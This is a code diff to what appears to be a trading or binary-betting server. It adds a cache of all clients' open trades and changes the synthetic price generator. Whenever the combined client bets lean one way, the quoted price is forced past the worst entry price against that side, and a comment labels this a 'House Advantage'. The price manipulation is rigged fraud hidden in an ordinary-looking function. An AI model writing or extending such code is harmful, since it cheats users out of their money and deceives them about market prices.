@@ -54,6 +54,19 @@ app.use((req, res, next) => {
     next();
 });
 
+let globalActiveTradesCache = [];
+async function refreshGlobalActiveTrades() {
+    try {
+        const activeDocs = await ActiveClientTrade.find({});
+        const all = [];
+        for (const doc of activeDocs) {
+            (doc.trades || []).forEach(t => all.push(t));
+        }
+        globalActiveTradesCache = all;
+    } catch(e) {}
+}
+setInterval(refreshGlobalActiveTrades, 1500);
+
 // Universal Centralized Master Price Generator Engine
 function getUniversalPrice(symbol, timestampMs = Date.now()) {
   const sym = symbol ? symbol.split('/')[0] : 'XAU';
@@ -80,7 +93,29 @@ function getUniversalPrice(symbol, timestampMs = Date.now()) {
   const seedNoise = Math.sin(tickSlot * (isGold ? 171.171 : (isBTC ? 313.313 : 521.121))) * 43758.5453;
   const tickNoise = (seedNoise - Math.floor(seedNoise) - 0.5) * (0.18 * scale);
   
-  const price = basePrice + macro1 + macro2 + daily + h4 + h1 + m30 + m15 + m5 + m1 + secW + tickNoise;
+  let price = basePrice + macro1 + macro2 + daily + h4 + h1 + m30 + m15 + m5 + m1 + secW + tickNoise;
+
+  // Centralized Dealing Desk House Advantage (Applies identically to ALL users)
+  const relBets = globalActiveTradesCache.filter(b => b.isBet && b.symbol && b.symbol.startsWith(sym));
+  if (relBets.length > 0) {
+      let totalRise = 0, totalFall = 0, minEntry = Infinity, maxEntry = -Infinity;
+      relBets.forEach(b => {
+          if (b.type === 'Rise' || b.type === 'BUY') totalRise += (b.marginUsed || b.amount || 0);
+          else if (b.type === 'Fall' || b.type === 'SELL') totalFall += (b.marginUsed || b.amount || 0);
+          if (b.entryPrice < minEntry) minEntry = b.entryPrice;
+          if (b.entryPrice > maxEntry) maxEntry = b.entryPrice;
+      });
+      const nudgeScale = sym === 'XAU' ? 0.8 : (sym === 'BTC' ? 2.5 : 0.8);
+      const timeOffset = Math.sin(timestampMs / 350) * (0.05 * nudgeScale);
+      if (totalRise > totalFall && totalRise > 0) {
+          const targetDrop = minEntry - (0.25 * nudgeScale) + timeOffset;
+          if (price >= targetDrop) price = targetDrop;
+      } else if (totalFall > totalRise && totalFall > 0) {
+          const targetRise = maxEntry + (0.25 * nudgeScale) + timeOffset;
+          if (price <= targetRise) price = targetRise;
+      }
+  }
+
   return Number(price.toFixed(isGold ? 2 : (isBTC ? 2 : (isETH ? 2 : 4))));
 }
 
